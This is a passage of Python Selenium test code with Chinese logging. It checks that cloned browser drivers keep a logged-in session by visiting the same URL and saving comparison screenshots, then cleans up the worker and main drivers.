        main_screenshot_path = test_screenshot_dir / "00_main_driver.png"
        try:
            self.driver.save_screenshot(str(main_screenshot_path))
            self._log(f"[TEST] ✓ 主driver截图已保存: {main_screenshot_path.name}")
        except Exception as e:
            self._log(f"[TEST] ⚠️ 主driver截图失败: {e}")

        # 创建ParallelDriverManager
        self._log(f"\n[TEST] 创建ParallelDriverManager...")
        try:
            manager = ParallelDriverManager(
                account_manager=self.account_manager,
                base_url=self.initial_url,
                chrome_options=self.chrome_options,
                target_domain=self.target_domain  # 🆕 添加这一行
            )
            self._log(f"[TEST] ✓ ParallelDriverManager创建成功")
        except Exception as e:
            self._log(f"[TEST] ✗ ParallelDriverManager创建失败: {e}")
            import traceback
            self._log(traceback.format_exc())
            return

        # 测试创建3个独立driver
        test_drivers = []
        num_drivers = 3

        self._log(f"\n[TEST] 开始创建 {num_drivers} 个独立driver...\n")

        for i in range(1, num_drivers + 1):
            self._log(f"{'='*60}")
            self._log(f"[TEST] 创建第 {i} 个独立driver")
            self._log(f"{'='*60}")

            try:
                # 创建克隆driver
                cloned_driver = manager.create_cloned_driver("default_account")
                test_drivers.append(cloned_driver)

                # 访问主driver当前的URL
                self._log(f"[TEST Driver-{i}] 访问目标URL: {current_url}")
                cloned_driver.get(current_url)
                time.sleep(1.0)  # 等待页面加载

                actual_url = cloned_driver.current_url
                self._log(f"[TEST Driver-{i}] 实际URL: {actual_url}")

                # 检查是否被重定向到登录页
                if 'login' in actual_url.lower() and 'login' not in current_url.lower():
                    self._log(f"[TEST Driver-{i}] ⚠️ 警告：被重定向到登录页！")
                    self._log(f"[TEST Driver-{i}] 这可能意味着登录状态未正确克隆")
                else:
                    self._log(f"[TEST Driver-{i}] ✓ URL正确，未被重定向")

                # 截图
                screenshot_path = test_screenshot_dir / f"0{i}_cloned_driver_{i}.png"
                cloned_driver.save_screenshot(str(screenshot_path))
                self._log(f"[TEST Driver-{i}] ✓ 截图已保存: {screenshot_path.name}")

                self._log(f"[TEST Driver-{i}] ✅ 第 {i} 个driver测试完成\n")

            except Exception as e:
                self._log(f"[TEST Driver-{i}] ✗ 失败: {e}")
                import traceback
                self._log(traceback.format_exc())

        # 汇总测试结果
        self._log(f"\n{'='*70}")
        self._log(f"[TEST] 测试汇总")
        self._log(f"{'='*70}")
        self._log(f"成功创建的driver数量: {len(test_drivers)}/{num_drivers}")
        self._log(f"截图保存位置: {test_screenshot_dir}")
        self._log(f"\n请检查以下截图文件:")
        self._log(f"  - 00_main_driver.png (主driver，对比基准)")
        for i in range(1, len(test_drivers) + 1):
            self._log(f"  - 0{i}_cloned_driver_{i}.png (独立driver {i})")

        # 清理所有独立driver
        self._log(f"\n[TEST] 清理独立driver...")
        manager.cleanup_all()

        self._log(f"{'='*70}")
        self._log(f"[TEST] 测试完成！")
        self._log(f"{'='*70}\n")

        # 重要提示
        self._log("⚠️  重要：请检查截图文件，确认以下内容:")
        self._log("   1. 所有截图的页面内容是否一致？")
        self._log("   2. 独立driver是否显示登录后的页面（而非登录页）？")
        self._log("   3. 是否有任何错误提示或异常页面？")
        self._log("\n   如果所有截图都正常，说明独立driver状态克隆成功！\n")

    def _cleanup(self):
        """清理资源"""
        self._log("\n[清理资源]")

        # 🆕 清理worker drivers（Phase 3创建的）
        if self.worker_drivers:
            self._log(f"清理 {len(self.worker_drivers)} 个worker drivers...")
            for i, worker_driver in enumerate(self.worker_drivers, 1):
                try:
                    # 检查是否是主driver（主driver由下面单独处理）
                    if worker_driver != self.driver:
                        worker_driver.quit()
                        self._log(f"  [{i}/{len(self.worker_drivers)}] Worker driver已关闭")
                    else:
                        self._log(f"  [{i}/{len(self.worker_drivers)}] 主driver（跳过，下面单独处理）")
                except Exception as e:
                    self._log(f"  [{i}/{len(self.worker_drivers)}] 关闭失败: {e}")

        # 关闭主driver
        if self.driver:
            try:
                self.driver.quit()
                self._log("主driver已关闭")
            except Exception as e:
                self._log(f"主driver关闭失败: {e}")
